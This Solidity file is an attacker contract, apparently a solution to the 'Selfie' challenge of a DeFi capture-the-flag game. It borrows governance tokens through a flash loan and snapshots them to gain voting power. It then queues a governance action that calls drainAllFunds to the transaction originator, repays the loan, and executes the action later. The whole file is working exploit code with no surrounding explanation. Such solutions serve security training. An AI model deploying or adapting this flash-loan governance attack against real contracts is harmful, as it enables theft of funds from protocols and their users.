// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILenderPool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns(uint256);
    function executeAction(uint256 actionId) external payable; 
}


contract SelfieAttacker {
    ILenderPool private immutable lenderPool;
    ISimpleGovernance private immutable simpleGovernance;
    IERC20 gToken;
    uint256 private actionId;

    constructor(address lenderPoolAddr, address simpleGovernanceAddr, address gTokenAddr) {
        lenderPool = ILenderPool(lenderPoolAddr);
        simpleGovernance = ISimpleGovernance(simpleGovernanceAddr);
        gToken = IERC20(gTokenAddr);
    }

    function receiveTokens(address tokenAddr, uint256) external {
        (bool success, ) = tokenAddr.call(abi.encodeWithSignature("snapshot()"));
        require(success, "Faild to take snapshot");
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", tx.origin);
        actionId = simpleGovernance.queueAction(address(lenderPool), data, 0);
        uint256 amount = gToken.balanceOf(address(this));
        gToken.transfer(msg.sender, amount);
    }

    function executeAction() external {
        simpleGovernance.executeAction(actionId);
    }

    function attack() external {
        uint256 amount = gToken.balanceOf(address(lenderPool));
        lenderPool.flashLoan(amount);
    }
}